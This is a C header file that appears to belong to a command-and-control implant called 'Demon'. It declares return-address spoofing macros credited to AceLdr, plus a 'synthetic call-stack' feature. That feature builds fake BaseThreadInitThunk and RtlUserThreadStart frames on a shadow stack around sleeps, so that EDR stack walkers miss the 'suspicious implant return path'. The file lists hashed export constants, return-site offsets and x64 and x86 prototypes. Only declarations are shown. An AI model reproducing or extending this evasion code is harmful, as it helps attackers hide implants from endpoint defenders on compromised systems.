#ifndef DEMON_SPOOF_H
#define DEMON_SPOOF_H

#include <windows.h>

// NOTE: this code is taken from AceLdr by kyleavery. So huge credit goes to him. https://github.com/kyleavery/AceLdr

#if _WIN64

typedef struct
{
    PVOID Trampoline;
    PVOID Function;
    PVOID Rbx;
} PRM, *PPRM;

static ULONG_PTR Spoof();

#define SPOOF_X( function, module, size )                             SpoofRetAddr( function, module, size, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_A( function, module, size, a )                          SpoofRetAddr( function, module, size, a, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_B( function, module, size, a, b )                       SpoofRetAddr( function, module, size, a, b, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_C( function, module, size, a, b, c )                    SpoofRetAddr( function, module, size, a, b, c, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_D( function, module, size, a, b, c, d )                 SpoofRetAddr( function, module, size, a, b, c, d, NULL, NULL, NULL, NULL )
#define SPOOF_E( function, module, size, a, b, c, d, e )              SpoofRetAddr( function, module, size, a, b, c, d, e, NULL, NULL, NULL )
#define SPOOF_F( function, module, size, a, b, c, d, e, f )           SpoofRetAddr( function, module, size, a, b, c, d, e, f, NULL, NULL )
#define SPOOF_G( function, module, size, a, b, c, d, e, f, g )        SpoofRetAddr( function, module, size, a, b, c, d, e, f, g, NULL )
#define SPOOF_H( function, module, size, a, b, c, d, e, f, g, h )     SpoofRetAddr( function, module, size, a, b, c, d, e, f, g, h )
#define SETUP_ARGS(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, ...) arg12
#define SPOOF_MACRO_CHOOSER(...) SETUP_ARGS(__VA_ARGS__, SPOOF_H, SPOOF_G, SPOOF_F, SPOOF_E, SPOOF_D, SPOOF_C, SPOOF_B, SPOOF_A, SPOOF_X, )
#define SpoofFunc(...) SPOOF_MACRO_CHOOSER(__VA_ARGS__)(__VA_ARGS__)

PVOID SpoofRetAddr(
    _In_    PVOID  Module,
    _In_    ULONG  Size,
    _In_    HANDLE Function,
    _Inout_ PVOID  a,
    _Inout_ PVOID  b,
    _Inout_ PVOID  c,
    _Inout_ PVOID  d,
    _Inout_ PVOID  e,
    _Inout_ PVOID  f,
    _Inout_ PVOID  g,
    _Inout_ PVOID  h
);

/*
 * ARC-02: Synthetic call-stack frames
 *
 * Builds a plausible kernel32!BaseThreadInitThunk -> ntdll!RtlUserThreadStart
 * frame chain on a shadow stack before each sleep/wait, so EDR stack walkers
 * see a normal thread call chain instead of a suspicious implant return path.
 */

/// Hash constants for export resolution
#define H_FUNC_BASETHREADINITTHUNK  0xe2491896
#define H_FUNC_RTLUSERTHREADSTART   0x0353797c

/// Well-known return-address offsets inside the target functions.
/// BaseThreadInitThunk+0xe is the typical post-call return site.
/// RtlUserThreadStart+0x21 is the typical return site in the outermost frame.
#define SYNTH_OFFSET_BTIT  0xe
#define SYNTH_OFFSET_RUTS  0x21

/// Shadow stack size: 4 KB is ample for the synthetic frames + shadow space.
#define SYNTH_SHADOW_SIZE  0x1000

/// Context saved/restored around the shadow-stack pivot.
typedef struct _SYNTH_STACK_CTX {
    PVOID  OriginalRsp;             /* caller RSP, saved before pivot         */
    PVOID  OriginalRbp;             /* caller RBP, saved before pivot         */
    PVOID  ShadowBase;              /* base of the allocated shadow stack     */
    SIZE_T ShadowSize;              /* size of the shadow stack allocation    */
    PVOID  ShadowRsp;               /* RSP to load (top of synthetic frames) */
    PVOID  ShadowRbp;               /* RBP to load (innermost frame pointer) */
    PVOID  BaseThreadInitThunkRet;  /* kernel32!BaseThreadInitThunk + offset  */
    PVOID  RtlUserThreadStartRet;   /* ntdll!RtlUserThreadStart + offset      */
    BOOL   Ready;                   /* TRUE after successful init             */
} SYNTH_STACK_CTX, *PSYNTH_STACK_CTX;

/// One-time resolution of return addresses and shadow stack allocation.
/// Returns TRUE on success. Safe to call multiple times (idempotent).
BOOL SynthStackInit(
    _Inout_ PSYNTH_STACK_CTX Ctx
);

/// Tear down the shadow stack and zero the context.
VOID SynthStackFree(
    _Inout_ PSYNTH_STACK_CTX Ctx
);

/// Build synthetic frames on the shadow stack and fill ShadowRsp / ShadowRbp.
/// Must be called after SynthStackInit() succeeds.
BOOL SynthStackPrepare(
    _Inout_ PSYNTH_STACK_CTX Ctx
);

/// Assembly stub: pivots RSP/RBP to the shadow stack, calls
/// WaitForSingleObjectEx(hObject, dwTimeout, bAlertable), then restores.
/// Defined in Spoof.x64.asm.
DWORD SynthStackSleep(
    _In_ PVOID              WaitFunc,
    _In_ HANDLE             hObject,
    _In_ DWORD              dwTimeout,
    _In_ BOOL               bAlertable,
    _In_ PSYNTH_STACK_CTX   Ctx
);

#else /* !_WIN64 — x86 */

/// x86 context for synthetic call-stack frames (ARC-02).
typedef struct _SYNTH_STACK_CTX_X86 {
    PVOID  OriginalEsp;
    PVOID  OriginalEbp;
    PVOID  ShadowBase;
    SIZE_T ShadowSize;
    PVOID  ShadowEsp;
    PVOID  ShadowEbp;
    PVOID  BaseThreadInitThunkRet;
    PVOID  RtlUserThreadStartRet;
    BOOL   Ready;
} SYNTH_STACK_CTX_X86, *PSYNTH_STACK_CTX_X86;

BOOL SynthStackInit86(
    _Inout_ PSYNTH_STACK_CTX_X86 Ctx
);

VOID SynthStackFree86(
    _Inout_ PSYNTH_STACK_CTX_X86 Ctx
);

BOOL SynthStackPrepare86(
    _Inout_ PSYNTH_STACK_CTX_X86 Ctx
);

/// x86 assembly stub: pivots ESP/EBP, calls WaitForSingleObjectEx, restores.
/// Uses stdcall convention (args pushed right-to-left).
DWORD SynthStackSleep86(
    _In_ PVOID                  WaitFunc,
    _In_ HANDLE                 hObject,
    _In_ DWORD                  dwTimeout,
    _In_ BOOL                   bAlertable,
    _In_ PSYNTH_STACK_CTX_X86   Ctx
);

#endif /* _WIN64 */

#endif
